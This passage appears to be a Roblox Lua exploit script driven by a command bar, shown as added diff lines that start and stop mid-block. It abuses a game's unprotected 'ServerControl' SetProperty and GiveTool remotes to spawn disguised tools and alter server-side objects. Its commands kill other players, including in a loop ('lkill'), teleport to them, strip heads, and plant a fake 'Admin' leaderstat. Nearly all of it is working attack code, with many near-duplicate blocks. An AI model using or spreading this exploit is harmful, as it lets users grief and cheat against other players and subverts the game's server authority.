+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+function CE:FireEvent(ItemName, Object, Property, Value)
+	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+
+Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://1587542316")
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","rbxassetid://568634722")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","rbxassetid://1587542316")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(1.2,1.2,1.2))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Orientation",Vector3.new(-0.23,12.94,1.05))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Position",Vector3.new(-111.387,3.568,-35.084))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripForward",Vector3.new(-0.545, -0.089, -0.834))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripPos",Vector3.new(0.2, -0.2, 0.2))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripRight",Vector3.new(1, -0.026, 0))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripUp",Vector3.new(-0.027, 1.996, -0.089))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"ToolTip",ToolTip)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"CanBeDropped",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["LocalScript"],"Disabled",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"Name",Name)
+wait()
+
+local Luger = MainUserW["BOOMER"]
+
+MainUserP:GetMouse().Button1Down:Connect(function()
+	if MainUserW:FindFirstChild("BOOMER") then
+		if MainUserP:GetMouse().Target.Parent:FindFirstChild("HumanoidRootPart") or MainUserP:GetMouse().Target.Parent.Parent:FindFirstChild("HumanoidRootPart") then
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(0.838, -0.026, -0.545))
+			local Animation = Instance.new("Animation")
+			Animation.AnimationId = "rbxassetid://95383980"
+			local AnimationLoader = MainUserP.Character.Humanoid:LoadAnimation(Animation)
+			AnimationLoader:Play()
+			AnimationLoader:AdjustSpeed(1)
+			wait()
+			Variables.workspace.GuiEvent:FireServer(".")
+			wait(0.5)
+			CE:FireEvent("BOOMER",MainUserW["."]:WaitForChild("Head"),"Parent",MainUserP:GetMouse().Target.Parent)
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(1, -0.026, 0))
+		end
+	end
+end)
+	end
+
+    if string.sub(cmdbar.Text,1,5) == "phone" or string.sub(cmdbar.Text,1,6) == prefix.."phone" then
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+local UserName  = game:GetService('Players').LocalPlayer.Name
+local Autoride = true
+
+local Animations = {Shoot = 95383980}
+local Icon, Mesh, Texture = 1587542316, 430345282, 430345284
+local Name, ToolTip = "BOOMER", "iPhone 6"
+
+local CE = {}
+local Variables = {
+	workspace = game:GetService("Workspace"),
+	players = game:GetService("Players")
+}
+
+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+function CE:FireEvent(ItemName, Object, Property, Value)
+	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+
+Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://1587542316")
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","rbxassetid://430345282")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","rbxassetid://430345284")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(.3,.3,.3))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Orientation",Vector3.new(-0.23,12.94,1.05))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Position",Vector3.new(-111.387,3.568,-35.084))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripForward",Vector3.new(-0.545, -0.089, -0.834))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripPos",Vector3.new(0.2, -0.2, 0.2))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripRight",Vector3.new(1, -0.026, 0))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripUp",Vector3.new(-0.027, 1.996, -0.089))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"ToolTip",ToolTip)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"CanBeDropped",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["LocalScript"],"Disabled",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"Name",Name)
+wait()
+
+local Luger = MainUserW["BOOMER"]
+
+MainUserP:GetMouse().Button1Down:Connect(function()
+	if MainUserW:FindFirstChild("BOOMER") then
+		if MainUserP:GetMouse().Target.Parent:FindFirstChild("HumanoidRootPart") or MainUserP:GetMouse().Target.Parent.Parent:FindFirstChild("HumanoidRootPart") then
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(0.838, -0.026, -0.545))
+			local Animation = Instance.new("Animation")
+			Animation.AnimationId = "rbxassetid://95383980"
+			local AnimationLoader = MainUserP.Character.Humanoid:LoadAnimation(Animation)
+			AnimationLoader:Play()
+			AnimationLoader:AdjustSpeed(1)
+			wait()
+			Variables.workspace.GuiEvent:FireServer(".")
+			wait(0.5)
+			CE:FireEvent("BOOMER",MainUserW["."]:WaitForChild("Head"),"Parent",MainUserP:GetMouse().Target.Parent)
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(1, -0.026, 0))
+		end
+	end
+end)
+    end
+
+ 	if string.sub(cmdbar.Text,1,5) == "crash" or string.sub(cmdbar.Text,1,6) == prefix.."crash" then
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+
+local UserName  = game:GetService('Players').LocalPlayer.Name
+local Autoride = true
+
+local Animations = {Shoot = 95383980}
+local Icon, Mesh, Texture = 1587542316, 430155854, 430155861
+local Name, ToolTip = "BOOMER", "Crackhead"
+
+local CE = {}
+local Variables = {
+	workspace = game:GetService("Workspace"),
+	players = game:GetService("Players")
+}
+
+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+function CE:FireEvent(ItemName, Object, Property, Value)
+	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+
+Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://1587542316")
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","rbxassetid://430155854")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","rbxassetid://430155861")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(3,3,3))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Orientation",Vector3.new(-0.23,12.94,1.05))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Position",Vector3.new(-111.387,3.568,-35.084))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripForward",Vector3.new(-0.545, -0.089, -0.834))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripPos",Vector3.new(0.2, -0.2, 0.2))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripRight",Vector3.new(1, -0.026, 0))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripUp",Vector3.new(-0.027, 1.996, -0.089))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"ToolTip",ToolTip)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"CanBeDropped",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["LocalScript"],"Disabled",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"Name",Name)
+wait()
+
+local Luger = MainUserW["BOOMER"]
+
+MainUserP:GetMouse().Button1Down:Connect(function()
+	if MainUserW:FindFirstChild("BOOMER") then
+		if MainUserP:GetMouse().Target.Parent:FindFirstChild("HumanoidRootPart") or MainUserP:GetMouse().Target.Parent.Parent:FindFirstChild("HumanoidRootPart") then
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(0.838, -0.026, -0.545))
+			local Animation = Instance.new("Animation")
+			Animation.AnimationId = "rbxassetid://95383980"
+			local AnimationLoader = MainUserP.Character.Humanoid:LoadAnimation(Animation)
+			AnimationLoader:Play()
+			AnimationLoader:AdjustSpeed(1)
+			wait()
+			Variables.workspace.GuiEvent:FireServer(".")
+			wait(0.5)
+			CE:FireEvent("BOOMER",MainUserW["."]:WaitForChild("Head"),"Parent",MainUserP:GetMouse().Target.Parent)
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(1, -0.026, 0))
+		end
+	end
+end)
+	end
+
+ 	if string.sub(cmdbar.Text,1,5) == "money" or string.sub(cmdbar.Text,1,6) == prefix.."money" then
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+
+local UserName  = game:GetService('Players').LocalPlayer.Name
+local Autoride = true
+
+local Animations = {Shoot = 95383980}
+local Icon, Mesh, Texture = 1587542316, 511726060, 511726139
+local Name, ToolTip = "BOOMER", "Benjamin Franklin"
+
+local CE = {}
+local Variables = {
+	workspace = game:GetService("Workspace"),
+	players = game:GetService("Players")
+}
+
+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+function CE:FireEvent(ItemName, Object, Property, Value)
+	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+
+Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://1587542316")
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","rbxassetid://511726060")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","rbxassetid://511726139")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(.01,.01,.01))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Orientation",Vector3.new(-0.23,12.94,1.05))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Position",Vector3.new(-111.387,3.568,-35.084))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripForward",Vector3.new(-0.545, -0.089, -0.834))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripPos",Vector3.new(0.2, -0.2, 0.2))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripRight",Vector3.new(1, -0.026, 0))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripUp",Vector3.new(-0.027, 1.996, -0.089))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"ToolTip",ToolTip)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"CanBeDropped",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["LocalScript"],"Disabled",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"Name",Name)
+wait()
+
+local Luger = MainUserW["BOOMER"]
+
+MainUserP:GetMouse().Button1Down:Connect(function()
+	if MainUserW:FindFirstChild("BOOMER") then
+		if MainUserP:GetMouse().Target.Parent:FindFirstChild("HumanoidRootPart") or MainUserP:GetMouse().Target.Parent.Parent:FindFirstChild("HumanoidRootPart") then
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(0.838, -0.026, -0.545))
+			local Animation = Instance.new("Animation")
+			Animation.AnimationId = "rbxassetid://95383980"
+			local AnimationLoader = MainUserP.Character.Humanoid:LoadAnimation(Animation)
+			AnimationLoader:Play()
+			AnimationLoader:AdjustSpeed(1)
+			wait()
+			Variables.workspace.GuiEvent:FireServer(".")
+			wait(0.5)
+			CE:FireEvent("BOOMER",MainUserW["."]:WaitForChild("Head"),"Parent",MainUserP:GetMouse().Target.Parent)
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(1, -0.026, 0))
+		end
+	end
+end)
+	end
+
+	lplayer = game.Players.LocalPlayer
+
+function GetPlayer(String)
+    local Found = {}
+    local strl = String:lower()
+    if strl == "all" then
+        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+            if v.Name ~= lplayer.Name then
+                table.insert(Found,v)
+            end
+        end   
+    elseif strl == "me" then
+        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+            if v.Name == lplayer.Name then
+                table.insert(Found,v)
+            end
+        end  
+    else
+        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+            if v.Name:lower():sub(1, #String) == String:lower() then
+                table.insert(Found,v)
+            end
+        end    
+    end
+    return Found    
+end
+
+if string.sub(cmdbar.Text,1,6) == "lkill " then 
+for f,g in pairs(GetPlayer(string.sub(cmdbar.Text,7)))do 
+local C=game:GetService('Players').LocalPlayer.Name
+local D={}
+local E={workspace=game:GetService("Workspace"),players=game:GetService("Players")}
+local F,G=E.players.LocalPlayer,E.workspace:FindFirstChild(C)
+function D:FireEvent(H,I,J,K)G:FindFirstChild(H)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=K,["Property"]=J,["Object"]=I})end
+_G.lkill=true
+while _G.lkill do 
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")F["Backpack"]:WaitForChild("PompousTheCloud").Parent=G
+D:FireEvent("PompousTheCloud",G.PompousTheCloud.Handle,"Name","Head")
+D:FireEvent("PompousTheCloud",G.PompousTheCloud.Head.Mesh,"MeshId","0")
+D:FireEvent("PompousTheCloud",G.PompousTheCloud.Head,"Parent",game.Players[g.Name].Character)
+game.Players.LocalPlayer.Character.PompousTheCloud:Remove()wait(0.01)
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+end 
+end 
+end;
+
+if string.sub(cmdbar.Text,1,5) == "kill "then
+game.workspace.GiveTool:FireServer("7602040", "PompousTheCloud") 
+for f,g in pairs(GetPlayer(string.sub(cmdbar.Text,6)))do 
+local C=game:GetService('Players').LocalPlayer.Name;
+local D={}
+local E={workspace=game:GetService("Workspace"),players=game:GetService("Players")}
+local F,G=E.players.LocalPlayer,E.workspace:FindFirstChild(C)
+function D:FireEvent(H,I,J,K)
+G:FindFirstChild(H)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=K,["Property"]=J,["Object"]=I})
+end;
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+F["Backpack"]:WaitForChild("PompousTheCloud").Parent=G;
+D:FireEvent("PompousTheCloud",G.PompousTheCloud.Handle,"Name","Head")
+D:FireEvent("PompousTheCloud",G.PompousTheCloud.Head.Mesh,"MeshId","0")
+D:FireEvent("PompousTheCloud",G.PompousTheCloud.Head,"Parent",game.Players[g.Name].Character)
+game.Players.LocalPlayer.Character.PompousTheCloud:Remove()
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+end 
+end
+
+if string.sub(cmdbar.Text,1,5) == "goto " then
+for i,v in pairs(GetPlayer(string.sub(cmdbar.Text,6))) do
+lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
+end
+end
+    if string.sub(cmdbar.Text,1,5) == "dtool" then--add cmd inside " "
+    local ToolName = ""
+local Counter = 0
+
+for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+if v:IsA("Tool") then
+Counter = Counter + 1
+ToolName = v.Name
+end
+end
+
+if Counter >= 1 then
+local Tool = game.Players.LocalPlayer.Character[ToolName]
+Tool.Parent = game.Workspace
+warn("Dropped!")
+else
+warn("No tool was found.")
+end
+    end
+
+if string.sub(cmdbar.Text,1,7) == "unlkill"then 
+    _G.lkill=false;
+end
+
+if string.sub(cmdbar.Text,1,4) == "kleg" then 
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud") -- YOUR GAMEPASS
+
+local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
+local Name = "NAME"-- NAME THE TOOL IF WANT 
+local CE = {} -- DON'T EDIT
+local C = { -- DON'T EDIT
+	workspace = game:GetService("Workspace"), 
+	players = game:GetService("Players") 
+}
+
+local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT
+
+
+function CE:FireEvent(ItemName, Object, Property, Value) -- DON'T EDIT
+	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
+end
+
+C.workspace.Buy:FireServer(0, "PompousTheCloud") -- DON'T EDIT
+
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","rbxassetid://101851696")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","rbxassetid://101851254")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(1,1,1))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Parent",MainUserW["Right Leg"])
+CE:FireEvent("PompousTheCloud",MainUserW["Head"],"Transparency","0")
+end
+
+if string.sub(cmdbar.Text,1,5) == "rhead" then 
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+
+local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
+local Name = "NAME"-- NAME THE TOOL IF WANT 
+local CE = {} -- DON'T EDIT
+local C = { -- DON'T EDIT
+	workspace = game:GetService("Workspace"), 
+	players = game:GetService("Players") 
+}
+
+local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT
+
+
+function CE:FireEvent(ItemName, Object, Property, Value) -- DON'T EDIT
+	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
+end
+
+C.workspace.Buy:FireServer(0, "PompousTheCloud") -- DON'T EDIT
+
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW -- DON'T EDIT
+CE:FireEvent("PompousTheCloud",MainUserW["Head"],"Transparency","1")
+CE:FireEvent("PompousTheCloud",MainUserW["Head"]["face"]:Remove())
+end
+
+if string.sub(cmdbar.Text,1,2)== "lb" then 
+	local UserName  = game:GetService('Players').LocalPlayer.Name
+	local mesh = 1107038050
+	local texture = 4638242624
+	local CE = {}
+	local Variables = {
+		workspace = game:GetService("Workspace"),
+		players = game:GetService("Players")
+	}
+
+	local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+	function CE:FireEvent(ItemName, Object, Property, Value)
+		MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+	end
+
+
+	game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+	MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+
+	CE:FireEvent("PompousTheCloud",MainUserW["Animate"]["jump"],"Name","Proxy")
+	CE:FireEvent("PompousTheCloud",MainUserW["Animate"]["Proxy"],"Value","Admin")
+	CE:FireEvent("PompousTheCloud",MainUserW["Animate"]["Proxy"],"Parent",MainUserP.leaderstats)
+end
+
+	if string.sub(cmdbar.Text,1,4) == "sign" then
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+local UserName  = game:GetService('Players').LocalPlayer.Name
+local mesh = 1107038050
+local texture = 4455434349 
+local CE = {}
+local Variables = {
+    workspace = game:GetService("Workspace"),
+    players = game:GetService("Players")
+}
+
+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+function CE:FireEvent(ItemName, Object, Property, Value)
+    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+
+
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+
+
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Anchored",true)
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"BrickColor",BrickColor.new(123, 0, 123))
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Position",Vector3.new(-70.515, 3974.46, 394.958))
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Rotation",Vector3.new(-180, -30.3, -180))
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"TextureId","rbxassetid://1587542316")
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Material",Enum.Material.Neon)
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Orientation",Vector3.new(0, -149.7, 0))
+wait(.01)
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Size",Vector3.new(30.5, 17.75, 0.67))
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Parent",Workspace)
+wait(7)
+local UserName  = game:GetService('Players').LocalPlayer.Name
+local mesh = 1107038050
+local texture = 4455434349 
+local CE = {}
+local Variables = {
+    workspace = game:GetService("Workspace"),
+    players = game:GetService("Players")
+}
+
+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+function CE:FireEvent(ItemName, Object, Property, Value)
+    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+
+
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+
+
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Anchored",true)
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"BrickColor",BrickColor.new(123, 0, 123))
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Position",Vector3.new(-8.005, 3973.827, 394.081))
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Rotation",Vector3.new(-180, -30.3, -180))
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"TextureId","rbxassetid://1587542316")
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Material",Enum.Material.Neon)
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Orientation",Vector3.new(0, 150, 0))
+wait(.01)
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Size",Vector3.new(30.5, 17.75, 0.67))
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Parent",Workspace)
+end
+
+	if string.sub(cmdbar.Text,1,4) == "gtag" then
+local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
+local Name = "NAME"-- NAME THE TOOL IF YOU WANT
+local CE = {} -- DON'T EDIT
+local C = { -- DON'T EDIT
+    workspace = game:GetService("Workspace"),
+    players = game:GetService("Players")
+}
+local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT
+ 
+ 
+function CE:FireEvent(ItemName, Object, Property, Value) -- Don't Change the 'Value'
+    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+ 
+C.workspace.Buy:FireServer(0, "PompousTheCloud") -- Change to your Object
+ 
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+while wait() do
+    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(0,255,0))
+end
+	end
+
+	if string.sub(cmdbar.Text,1,4) == "rtag" then
+local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
+local Name = "NAME"-- NAME THE TOOL IF YOU WANT
+local CE = {} -- DON'T EDIT
+local C = { -- DON'T EDIT
+    workspace = game:GetService("Workspace"),
+    players = game:GetService("Players")
+}
+local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT
+ 
+ 
+function CE:FireEvent(ItemName, Object, Property, Value) -- Don't Change the 'Value'
+    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+ 
+C.workspace.Buy:FireServer(0, "PompousTheCloud") -- Change to your Object
+ 
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+while wait() do
+    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(255,0,0))
+end
+	end
+
+	if string.sub(cmdbar.Text,1,4) == ">btag" then
+local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
+local Name = "NAME"-- NAME THE TOOL IF YOU WANT
+local CE = {} -- DON'T EDIT
+local C = { -- DON'T EDIT
+    workspace = game:GetService("Workspace"),
+    players = game:GetService("Players")
+}
+local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT
+ 
+ 
+function CE:FireEvent(ItemName, Object, Property, Value) -- Don't Change the 'Value'
+    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+ 
+C.workspace.Buy:FireServer(0, "PompousTheCloud") -- Change to your Object
+ 
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+while wait() do
+    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(0,0,255))
+end
+	end
+
+	if string.sub(cmdbar.Text,1,4) == "otag" then
+local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
+local Name = "NAME"-- NAME THE TOOL IF YOU WANT
+local CE = {} -- DON'T EDIT
+local C = { -- DON'T EDIT
+    workspace = game:GetService("Workspace"),
+    players = game:GetService("Players")
+}
+local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT
+ 
+ 
+function CE:FireEvent(ItemName, Object, Property, Value) -- Don't Change the 'Value'
+    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+ 
+C.workspace.Buy:FireServer(0, "PompousTheCloud") -- Change to your Object
+ 
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+while wait() do
+    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(255,115,0))
+end
+	end
+
+	if string.sub(cmdbar.Text,1,4) == "ytag" then
+local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
+local Name = "NAME"-- NAME THE TOOL IF YOU WANT
+local CE = {} -- DON'T EDIT
+local C = { -- DON'T EDIT
+    workspace = game:GetService("Workspace"),
+    players = game:GetService("Players")
+}
+local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT
+ 
+ 
+function CE:FireEvent(ItemName, Object, Property, Value) -- Don't Change the 'Value'
+    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+ 
+C.workspace.Buy:FireServer(0, "PompousTheCloud") -- Change to your Object
+ 
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+while wait() do
